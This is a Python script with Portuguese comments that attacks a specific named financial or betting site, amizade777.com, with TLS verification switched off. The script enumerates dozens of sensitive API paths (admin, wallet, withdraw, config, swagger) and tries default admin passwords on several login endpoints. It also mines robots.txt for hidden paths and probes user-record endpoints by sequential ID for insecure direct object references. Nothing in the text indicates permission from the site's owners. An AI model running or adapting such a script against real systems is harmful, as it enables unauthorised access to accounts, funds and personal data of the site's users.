"""
Testa todos os endpoints relevantes do sistema financeiro.
Base de API identificada: /prod-api
"""
import urllib.request, ssl, json, re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(method, url, data=None, headers=None):
    h = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    body = json.dumps(data).encode() if data else None
    try:
        r = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(4096).decode("utf-8", "ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(2048).decode("utf-8", "ignore")
        except:
            raw = ""
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

base_ds  = "https://ds.amizade777.com"
base_m   = "https://m.amizade777.com"
api_base = "/prod-api"

# =====================================================
# 1. Descoberta de endpoints com a base /prod-api
# =====================================================
print("\n[1] ENDPOINTS /prod-api em ds.amizade777.com")
print("="*55)

endpoints_api = [
    "/prod-api",
    "/prod-api/",
    "/prod-api/login",
    "/prod-api/auth/login",
    "/prod-api/user/login",
    "/prod-api/api/login",
    "/prod-api/register",
    "/prod-api/auth/register",
    "/prod-api/user/register",
    "/prod-api/user/info",
    "/prod-api/user/profile",
    "/prod-api/user/me",
    "/prod-api/user",
    "/prod-api/users",
    "/prod-api/balance",
    "/prod-api/wallet",
    "/prod-api/wallet/balance",
    "/prod-api/wallet/info",
    "/prod-api/deposit",
    "/prod-api/withdraw",
    "/prod-api/withdrawal",
    "/prod-api/transfer",
    "/prod-api/transaction",
    "/prod-api/transactions",
    "/prod-api/order",
    "/prod-api/orders",
    "/prod-api/recharge",
    "/prod-api/pay",
    "/prod-api/payment",
    "/prod-api/admin",
    "/prod-api/admin/user",
    "/prod-api/admin/users",
    "/prod-api/admin/login",
    "/prod-api/system/info",
    "/prod-api/system/config",
    "/prod-api/config",
    "/prod-api/version",
    "/prod-api/health",
    "/prod-api/status",
    "/prod-api/docs",
    "/prod-api/swagger",
    "/prod-api/swagger-ui",
    "/prod-api/openapi.json",
    "/prod-api/openapi.yaml",
    "/prod-api/v1/login",
    "/prod-api/v1/user",
    "/prod-api/v1/wallet",
    "/prod-api/app/version",
    "/prod-api/app/config",
    "/prod-api/member/login",
    "/prod-api/member/register",
    "/prod-api/member/info",
    "/prod-api/member/balance",
    "/prod-api/finance/deposit",
    "/prod-api/finance/withdraw",
    "/prod-api/finance/record",
]

for path in endpoints_api:
    for method in ["GET", "POST"]:
        st, h, body = req(method, base_ds + path)
        if st not in (0, 404, 405):
            ct = h.get("Content-Type", h.get("content-type", ""))
            preview = body[:100].replace("\n", " ").replace("\r", "")
            print(f"  [{method}] [{st}] {path}")
            if body.strip().startswith("{"):
                print(f"    -> {preview}")
            break  # se GET funcionou, não precisa testar POST

# =====================================================
# 2. Testar login com credenciais padrão
# =====================================================
print("\n\n[2] TESTANDO LOGIN COM CREDENCIAIS PADRÃO")
print("="*55)

login_endpoints = [
    "/prod-api/login",
    "/prod-api/auth/login",
    "/prod-api/user/login",
    "/prod-api/member/login",
    "/login",
    "/api/login",
    "/api/v1/login",
]

credenciais_teste = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "password"},
    {"username": "test",  "password": "test"},
    {"username": "admin@admin.com", "password": "admin"},
    {"mobile": "admin", "password": "admin", "code": ""},
    {"phone": "13800000000", "password": "123456"},
    {"email": "admin@example.com", "password": "admin123"},
]

for ep in login_endpoints:
    st, h, body = req("GET", base_ds + ep)
    if st in (200, 400, 401, 422):
        print(f"\n  Endpoint ativo: {ep} [GET={st}]")
        # Testar POST com uma credencial
        for cred in credenciais_teste[:3]:
            st2, h2, body2 = req("POST", base_ds + ep, cred)
            if body2.strip().startswith("{"):
                try:
                    j = json.loads(body2)
                    print(f"    POST {cred} -> [{st2}] {json.dumps(j, ensure_ascii=False)[:150]}")
                except:
                    print(f"    POST {cred} -> [{st2}] {body2[:100]}")

# =====================================================
# 3. robots.txt — caminhos proibidos = pistas
# =====================================================
print("\n\n[3] ROBOTS.TXT")
print("="*55)
for base in [base_ds, base_m]:
    st, _, body = req("GET", base + "/robots.txt")
    print(f"  {base}/robots.txt [{st}]:")
    print(f"    {body[:300]}")

# =====================================================
# 4. Testar IDOR básico — /prod-api/user/1, 2, 3...
# =====================================================
print("\n\n[4] TESTE IDOR — /prod-api/user/N")
print("="*55)
for uid in [1, 2, 3, 100, 999, 0, -1]:
    for path_template in ["/prod-api/user/{}", "/prod-api/member/{}", "/prod-api/users/{}"]:
        path = path_template.format(uid)
        st, h, body = req("GET", base_ds + path)
        if st not in (0, 404, 405):
            print(f"  [{st}] {path} -> {body[:100]}")

print("\n\nConcluído.")
